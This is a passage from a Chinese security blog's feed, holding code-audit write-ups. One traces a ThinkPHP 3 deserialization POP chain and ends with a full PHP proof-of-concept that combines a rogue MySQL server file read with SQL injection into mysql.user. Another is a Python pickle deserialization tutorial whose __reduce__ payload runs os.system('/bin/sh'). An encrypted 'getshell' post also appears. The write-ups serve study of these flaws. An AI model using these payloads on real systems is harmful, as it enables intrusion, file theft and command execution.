class="string">&#x27;where&#x27;</span>] = $where;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 分析表达式</span></span><br><span class="line">        $options = <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($options[<span class="string">&#x27;where&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($options[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($options[<span class="string">&#x27;where&#x27;</span>][$pk])) &#123;</span><br><span class="line">            $pkValue = $options[<span class="string">&#x27;where&#x27;</span>][$pk];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;_before_delete($options)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;db-&gt;delete($options);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== $result &amp;&amp; is_numeric($result)) &#123;</span><br><span class="line">            $data = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($pkValue)) &#123;</span><br><span class="line">                $data[$pk] = $pkValue;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_after_delete($data, $options);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 返回删除记录个数</span></span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>$pk</code>其实就是<code>$this-&gt;pk</code>，是完全可控的。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120120035.png" alt=""></p><p>首先来看第一个if语句，<code>$options</code>是从跳板1传过来的，在跳板1中可以控制其是否为空。<code>$this-&gt;options['where']</code>是成员属性，是可控的，而且嵌套的if语句中<code>data</code>参数也是可控的，那么符合条件后，又调用了一次自己<code>$this-&gt;delete()</code>，但是这时候的参数<code>$this-&gt;data[$pk]</code>是我们可控的。</p><p>这时<code>delete()</code>我们就可以成功带完全可控参数访问了。</p><p>最终这个函数会调用具体数据库驱动类中的<code>delete()</code>中去，即：<code>$result = $this-&gt;db-&gt;delete($options);</code>，那么这时候我们就可以调用任意自带的数据库类中的<code>delete()</code>方法了。</p><h3 id="终点">终点</h3><p>文件：<code>/ThinkPHP/Library/Think/Db/Driver.class.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120121706.png" alt=""></p><p><code>$table</code>是可控的，将<code>$table</code>拼接到<code>$sql</code>传入了<code>$this-&gt;execute()</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$str, $fetchSql = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_linkID) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;queryStr = $str;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind)) &#123;</span><br><span class="line">            $that           = <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queryStr = strtr(<span class="keyword">$this</span>-&gt;queryStr, array_map(<span class="function"><span class="keyword">function</span> (<span class="params">$val</span>) <span class="title">use</span> (<span class="params">$that</span>) </span>&#123;<span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span> . $that-&gt;escapeString($val) . <span class="string">&#x27;\&#x27;&#x27;</span>;&#125;, <span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($fetchSql) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;queryStr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//释放前次的查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;PDOStatement)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;free();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;executeTimes++;</span><br><span class="line">        N(<span class="string">&#x27;db_write&#x27;</span>, <span class="number">1</span>); <span class="comment">// 兼容代码</span></span><br><span class="line">        <span class="comment">// 记录开始执行时间</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;debug(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;PDOStatement = <span class="keyword">$this</span>-&gt;_linkID-&gt;prepare($str);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="keyword">$this</span>-&gt;PDOStatement) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;bind <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($val)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;PDOStatement-&gt;bindValue($key, $val[<span class="number">0</span>], $val[<span class="number">1</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;PDOStatement-&gt;bindValue($key, $val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bind = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;PDOStatement-&gt;execute();</span><br><span class="line">            <span class="comment">// 调试结束</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;debug(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> === $result) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;numRows = <span class="keyword">$this</span>-&gt;PDOStatement-&gt;rowCount();</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^\s*(INSERT\s+INTO|REPLACE\s+INTO)\s+/i&quot;</span>, $str)) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;lastInsID = <span class="keyword">$this</span>-&gt;_linkID-&gt;lastInsertId();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;numRows;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\PDOException $e) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>函数开头第一行先调用<code>initConnect()</code>初始化数据库连接：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120122004.png" alt=""></p><p>可以通过控制成员属性，使程序调用到<code>$this-&gt;connect()</code>。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120122054.png" alt=""></p><p>通过<code>$this-&gt;config</code>里的配置去创建了数据库连接，接着去执行前面拼接的<code>DELETE</code>SQL语句。</p><p>所以这条POP链的功能就在于可以连接任意数据库，再利用delete注入。</p><h2 id="漏洞利用">漏洞利用</h2><p>这个POP链看起来比较鸡肋，因为必须先拿到数据库的配置文件才能注入。但是在MySQL攻击面这篇文章，第一种攻击面就是<strong>读取客户端任意文件</strong>，前提就是伪造一个恶意的MySQL服务端。那么我就可以先把配置文件写成恶意的MySQL服务端，再读取客户端的数据库配置文件，最后通过这个配置文件进行delete注入。</p><h3 id="恶意MySQL服务端">恶意MySQL服务端</h3><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120140208.png" alt=""></p><h3 id="POC">POC</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> $config = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span>           =&gt; <span class="string">&#x27;mysql&#x27;</span>, <span class="comment">// 数据库类型</span></span><br><span class="line">            <span class="string">&#x27;hostname&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// 服务器地址</span></span><br><span class="line">            <span class="string">&#x27;database&#x27;</span>       =&gt; <span class="string">&#x27;tp3&#x27;</span>, <span class="comment">// 数据库名</span></span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 用户名</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>       =&gt; <span class="string">&#x27;root&#x27;</span>, <span class="comment">// 密码</span></span><br><span class="line">            <span class="string">&#x27;hostport&#x27;</span>       =&gt; <span class="string">&#x27;3307&#x27;</span>, <span class="comment">// 端口</span></span><br><span class="line">            <span class="string">&#x27;dsn&#x27;</span>            =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//</span></span><br><span class="line">            <span class="string">&#x27;params&#x27;</span>         =&gt; <span class="keyword">array</span>(), <span class="comment">// 数据库连接参数</span></span><br><span class="line">            <span class="string">&#x27;charset&#x27;</span>        =&gt; <span class="string">&#x27;utf8&#x27;</span>, <span class="comment">// 数据库编码默认采用utf8</span></span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// 数据库表前缀</span></span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>          =&gt; <span class="literal">false</span>, <span class="comment">// 数据库调试模式</span></span><br><span class="line">            <span class="string">&#x27;deploy&#x27;</span>         =&gt; <span class="number">0</span>, <span class="comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span></span><br><span class="line">            <span class="string">&#x27;rw_separate&#x27;</span>    =&gt; <span class="literal">false</span>, <span class="comment">// 数据库读写是否分离 主从式有效</span></span><br><span class="line">            <span class="string">&#x27;master_num&#x27;</span>     =&gt; <span class="number">1</span>, <span class="comment">// 读写分离后 主服务器数量</span></span><br><span class="line">            <span class="string">&#x27;slave_no&#x27;</span>       =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">// 指定从服务器序号</span></span><br><span class="line">            <span class="string">&#x27;db_like_fields&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> $options   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $data = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handle;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Image</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $img;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143657.png" alt=""></p><p>然后发送请求，可以在mysql.log中看到读取的文件信息：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143611.png" alt=""></p><p>接下来就是更改POC中数据库的相关配置为mysql.log中读取的到的内容即可。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210120143910.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;TP3-0反序列化POP链-MySQL伪造恶意服务端&quot;&gt;TP3.0反序列化POP链+MySQL伪造恶意服务端&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Reference: 米斯特安全团队 &lt;a href=&quot;https://mp.weixin.qq.com/s/S
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHPECMSv3.5getshell</title>
    <link href="http://ca0y1h.top/code_audit/PHP/10.PHPECMS3.5getshell/"/>
    <id>http://ca0y1h.top/code_audit/PHP/10.PHPECMS3.5getshell/</id>
    <published>2021-01-10T03:27:32.000Z</published>
    <updated>2021-01-10T03:33:41.012Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ee5df1625aab02c528f1023c4be7accb06825ca117cf20e9a80a9598cce2b731"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Python反序列化漏洞</title>
    <link href="http://ca0y1h.top/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://ca0y1h.top/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-01-03T13:19:56.000Z</published>
    <updated>2021-01-03T13:20:48.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python反序列化漏洞">Python反序列化漏洞</h1><p>这是关于Python语言相关漏洞的第三篇：反序列化漏洞。学过PHP反序列化漏洞之后，肯定知道关于PHP反序列化各式各样的利用方式，比如POP链构造，Phar反序列化，原生类反序列化以及字符逃逸等等，Python相对而言没有PHP那么灵活，关于反序列化漏洞的话比较容易理解，主要涉及这么几个概念：pickle，pvm，<code>__reduce__</code>魔术方法。</p><p>K0rz3n师傅的文章已经讲的极为透彻了，我就搬运总结学习一下。</p><h2 id="0x01-python序列化和反序列化">0x01 python序列化和反序列化</h2><h3 id="序列化">序列化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;K0rz3n&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Hello ! My friends&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure><p>python3的输出：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103202644.png" alt=""></p><p>python2的输出：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103202846.png" alt=""></p><p>虽然看起来有点难理解，但是还是可以清楚地看到我们对象的属性 name ca01h，我们对象所属的类 people 都已近存储在里面了。</p><h3 id="反序列化">反序列化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;K0rz3n&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Hello ! My friends&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">d = pickle.loads(c)</span><br><span class="line">d.say()</span><br></pre></td></tr></table></figure><p>无论python2还是python3，输出的都是<code>Hello ! My friends</code>，也就是说我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法。</p><h2 id="0x02-反序列化漏洞">0x02 反序列化漏洞</h2><h3 id="漏洞常见出现地方">漏洞常见出现地方</h3><p><strong>1.通常在解析认证token，session的时候</strong></p><p>现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。</p><p><strong>2.可能将对象Pickle后存储成磁盘文件。</strong></p><p><strong>3.可能将对象Pickle后在网络中传输。</strong></p><p>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的。</p><h3 id="漏洞利用方式">漏洞利用方式</h3><p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。</p><p>简单说明一下<code>__reduce__()</code>函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。</p><p>show code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> test</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103204054.png" alt=""></p><p>稍微解释一下这几个指令：</p><ul><li>S : 后面跟的是字符串</li><li>( ：作为命令执行到哪里的一个标记</li><li>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中</li><li>c ：定义模块名和类名（模块名和类名之间使用回车分隔）</li><li>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中</li><li>. ：点号是结束符</li></ul><p>另外p0 p1 p2 p3只是标签，对命令我们的payload没有任何影响。</p><p>我们让上面这个结果进行反序列化看一下结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span 